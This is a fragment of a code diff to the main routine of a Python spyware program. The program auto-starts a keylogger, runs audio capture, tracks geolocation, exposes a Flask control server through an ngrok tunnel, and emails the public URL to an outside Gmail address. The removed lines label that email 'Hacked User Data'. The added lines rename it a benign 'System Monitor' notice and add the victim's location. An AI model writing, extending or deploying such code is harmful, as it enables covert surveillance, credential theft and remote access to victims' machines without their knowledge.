     # Start popup manager
     popup_manager.start()
@@ -2035,30 +2950,42 @@ def main():
     audio_thread = threading.Thread(target=audio_capture_loop, daemon=True)
     audio_thread.start()
 
+    # Auto-start keylogger if configured
+    if AUTO_START_KEYLOGGER:
+        print("🔧 Auto-starting keylogger...")
+        key_logger.start_logging()
+
     # Get local IP
     local_ip = get_local_ip()
-    print(f"🏠 Local access: http://{local_ip}:5000")
+    print(f"🏠 Local access: http://{local_ip}:{PORT}")
     
-    # Start ngrok tunnel
-    print("🌐 Starting ngrok tunnel...")
-    if ngrok_manager.start_ngrok():
-        mailer = SecureJetsuMailer()
-        mailer.send(
-        to_email="warmaker35@gmail.com",
-        subject="Hacked User Data",
-        message = f"""
-        Wan Mode: {ngrok_manager.public_url}
-        Lan Mode: http://{{local_ip}}:5000
-        """)
-        print(f"✅ Ngrok started: {ngrok_manager.public_url}")
+    # Start ngrok tunnel if configured
+    if AUTO_START_NGROK:
+        print("🌐 Starting ngrok tunnel...")
+        if ngrok_manager.start_ngrok():
+            # Send notification email
+            mailer.send(
+                subject="System Monitor Started",
+                message=f"""
+                🚀 System Monitor is now active!
+                
+                🌐 Wan Mode: {ngrok_manager.public_url}
+                🏠 Lan Mode: http://{local_ip}:{PORT}
+                
+                📍 Location: {geo_tracker.get_geolocation() or 'Unknown'}
+                ⏰ Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+                🔒 Security: Jetsu Encoded
+                """
+            )
+            print(f"✅ Ngrok started: {ngrok_manager.public_url}")
+        else:
+            print("❌ Ngrok failed to start")
     else:
-        print("❌ Ngrok failed to start")
-    
-    
+        print("ℹ️  Ngrok auto-start disabled in configuration")
     
     # Start Flask app
-    print("🌐 Starting web server...")
-    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
+    print(f"🌐 Starting web server on port {PORT}...")
+    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
 
 if __name__ == '__main__':
     main()
